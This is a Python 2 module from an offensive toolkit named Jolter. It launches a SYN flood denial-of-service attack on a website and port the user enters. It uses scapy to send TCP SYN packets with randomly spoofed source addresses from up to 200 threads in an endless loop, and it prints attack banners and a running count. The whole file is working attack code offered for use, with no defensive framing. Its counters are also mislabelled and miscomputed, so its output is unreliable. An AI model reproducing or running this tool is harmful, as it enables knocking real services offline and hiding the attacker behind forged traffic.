#!/usr/bin/env python2

#:-:-:-:-:-:-#
#   Jolter   #
#:-:-:-:-:-:-#

#This module is a part of Jolter
#https://github.com/code-sploit/jolter 

import sys
import time
import os
import socket
from socket import *
import random
import urllib2
import string
import threading
from colors import *
from threading import *
from time import sleep
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

def syn_dos(web):

  try:

    time.sleep(0.2)
    p = input(color.BLUE +"   [!] Enter the Port No. (eg. 80) :> ")
    time.sleep(0.2)
    print (''+R+'   [!] Port set ---> %s' % (p))
    time.sleep(0.2)
    print(''+R+" +==================================================================+\n")
    time.sleep(0.5)
    print ''+O+' [*] Preparing for the SYN Flood Attack...'
    time.sleep(0.4)
    print GR+' [*] Initializing multi-threading...'
    time.sleep(0.7)
    print O+' [*] Preparing for spoofing of SYN-ACK requests...'
    time.sleep(1)
    class sendSYN(threading.Thread):

	global target, port

	def __init__(self):
		threading.Thread.__init__(self)
	
	def run(self):
		
		i = IP()
		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		i.dst = target
		t = TCP()
		t.sport = random.randint(1,65535)
		t.dport = port
		t.flags = 'S'
		send(i/t, verbose=0)
	
    target       = None
    port         = None
    print G+' [*] Setting thread limits...\n'
    time.sleep(0.5)
    thread_limit = 200
    total        = 0

    print '' + GR +'   Final Summary of the  Attack Surface:\n'
    print '' + B + ' +-------------+----------------------------------+'
    print '' + B + ' |   Website   |        \033[1;96m' + web + ''
    print '' + B + ' +-------------+----------------------------------+'
    print '' + B + ' | Attack Type |           \033[1;96mSYN Fl00D'
    print '' + B + ' +-------------+----------------------------------+'
    print '' + B + ' |     Port    |            \033[1;96m %s' % (p)
    print '' + B + ' +-------------+----------------------------------+'

    b = raw_input(''+O+"\n   [!] Press 'Enter' to start the Fl00d...")

    if b == "":
        time.sleep(0.1)
        print ''+B+'\n   [*] Getting everything ready...'
        time.sleep(0.3)
        print ''+GR+'   [!] Finalising everything...'
        time.sleep(0.8)
        print ''+R+'   [!] Launching the Attack...'
        time.sleep(0.7)
		
	target = str(web)
	port = int(p)
	conf.iface = "eth0" 

	print (""+G+"\n   [!] Trying \033[1;93m%s:%i \033[1;92mwith crafted SYN-ACK requests." % (target, port))
	while True:
		if threading.activeCount() < thread_limit: 
			sendSYN().start()
			total += 1
			print O+"\r   [!] Handshakes Received  \033[1;31m-->  \033[1;32m", str(total),

  except KeyboardInterrupt:
	print ''+R+'\n\n   [!] SYN Fl00D interrupted! Fl00D Attack Aborted !\n'
  print O+'  [!] Website : '+GR + web
  print O+'  [!] Total Requests Sent : '+ str(total*thread_limit) + '\n'
